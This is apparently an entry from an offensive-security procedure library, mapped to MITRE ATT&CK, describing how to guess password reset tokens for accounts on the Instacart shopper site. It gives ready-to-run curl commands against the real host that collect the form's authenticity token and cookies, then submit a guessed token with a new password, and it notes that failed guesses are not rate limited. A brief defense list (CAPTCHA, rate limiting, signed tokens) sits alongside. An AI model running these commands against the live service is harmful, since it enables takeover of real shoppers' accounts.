---
tags:
  - brute-force
  - credential-access
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-post-password-reset]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:33:06.577Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 54822637-409b-49f8-b0d0-e4c5ad335418
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Validate and Change Password with Guessed Token

## Summary

This procedure tests a guessed 20-character password reset token by submitting a POST request to the validation endpoint, attempting to set a new password and confirming the lack of rate limiting through error responses.

## Description

The Instacart shopper app's /password endpoint (POST) validates reset tokens without restrictions. Invalid tokens return 'Reset password token is invalid', allowing attackers to probe endlessly. A successful validation changes the password, granting account access. This step isolates single-token testing before scaling to brute force.

## Requirements

1. Guessed 20-character token
2. Authenticity token from the reset form
3. New password to set
4. Cookies from initial session

## Defense

Defensive measures and detection strategies:

- Enforce CAPTCHA after failed attempts
- Rate limit to 10 requests per minute per IP
- Use HMAC-signed tokens resistant to guessing
- Audit logs for token validation failures

## Objectives

1. Validate a single token guess
2. Change password on success
3. Confirm no immediate blocking

## Instructions

### Step 1: Prepare Request Data

**Context**: Extract authenticity_token from the reset page and prepare form data.

**Command** ([[commands/curl-get-password-page]]):
```bash
curl -X GET https://shoppers.instacart.com/password -c cookies.txt | grep -o 'authenticity_token.*value="[^"]*"'
```

> Parses HTML to get the token. Expected output: The authenticity_token value.

### Step 2: Submit Guessed Token

**Context**: Send POST with guessed token and new password to test validation.

**Command** ([[commands/curl-post-password-reset]]):
```bash
curl -X POST https://shoppers.instacart.com/password \
  -d "utf8=%E2%9C%93" \
  -d "_method=put" \
  -d "authenticity_token=your_token_here" \
  -d "driver[reset_password_token]=guessed_token" \
  -d "driver[password]=new_password" \
  -d "driver[password_confirmation]=new_password" \
  -d "commit=Change+my+password" \
  -b cookies.txt -v
```

> Executes the reset. Expected output: 'Reset password token is invalid' for failure or success message/redirect for valid token.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Brute Force]] Brute Force

### Sub-Techniques


## Commands Used

- [[commands/curl-get-password-page]]
- [[commands/curl-post-password-reset]]

## Tools Used


## Tags

- [[brute-force]]
- [[credential-access]]
